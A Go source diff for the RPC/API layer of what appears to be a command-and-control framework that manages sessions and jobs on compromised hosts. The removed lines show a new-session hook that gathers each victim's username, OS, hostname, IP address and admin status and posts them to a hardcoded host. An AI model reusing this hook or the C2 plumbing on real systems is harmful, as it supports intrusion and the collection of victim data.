@@ -1,10 +1,8 @@
 package rpc
 
 import (
-	"bytes"
 	"context"
 	"crypto/tls"
-	"encoding/json"
 	"net"
 	"net/http"
 	"sync"
@@ -17,9 +15,9 @@ import (
 	"github.com/iDigitalFlame/xmt/device"
 )
 
-const (
-	prefix = `^/api/v1`
+const prefix = `^/api/v1`
 
+const (
 	expire  = time.Hour * 2
 	timeout = time.Second * 10
 )
@@ -99,10 +97,10 @@ func (r *Server) complete(j *c2.Job) {
 	r.lock.Unlock()
 }
 func setup(s *Server, m *routex.Mux) {
+	m.Must("session", prefix+`/session/(?P<session>[a-zA-Z0-9]+)$`, routex.Func(s.httpSession))
 	m.MustMethod("sessions", http.MethodGet, prefix+`/session$`, routex.Func(s.httpSessionsGet))
 	m.MustMethod("listeners", http.MethodGet, prefix+`/listener$`, routex.Func(s.httpListenersGet))
 	m.Must("session_job", prefix+`/session/(?P<session>[a-zA-Z0-9]+)/(?P<job>[0-9]+)$`, routex.Func(s.httpJob))
-	m.MustMethod("session", http.MethodGet, prefix+`/session/(?P<session>[a-zA-Z0-9]+)$`, routex.Func(s.httpSessionGet))
 	m.MustMethod("listener", http.MethodGet, prefix+`/listener/(?P<listener>[a-zA-Z0-9]+)$`, routex.Func(s.httpListenerGet))
 	m.MustMethod("session_jobs", http.MethodGet, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/job$`, routex.Func(s.httpJobsGet))
 	m.MustMethod("session_result", http.MethodGet, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/(?P<job>[0-9]+)/result$`, routex.Func(s.httpJobResultGet))
@@ -183,32 +181,5 @@ func NewContext(x context.Context, c *c2.Server) *Server {
 	r.ctx, r.cancel = context.WithCancel(x)
 	r.mux.Error = routex.FuncError(errors)
 	setup(r, r.mux)
-	for _, l := range c.Listeners() {
-		l.New = doNew
-	}
 	return r
-}
-
-func doNew(s *c2.Session) {
-	var v string
-	for _, n := range s.Device.Network {
-		for _, a := range n.Address {
-			if a.IsZero() || a.IsLinkLocalUnicast() || a.IsLoopback() {
-				continue
-			}
-			v = a.String()
-			break
-		}
-	}
-	d := map[string]string{
-		"username":  s.Device.User,
-		"os":        s.Device.Version,
-		"hostname":  s.Device.Hostname,
-		"ipaddress": v,
-	}
-	if s.Device.Elevated {
-		d["username"] = "*" + d["username"]
-	}
-	b, _ := json.Marshal(d)
-	http.Post("http://10.15.0.12/client", "application/json", bytes.NewReader(b))
 }
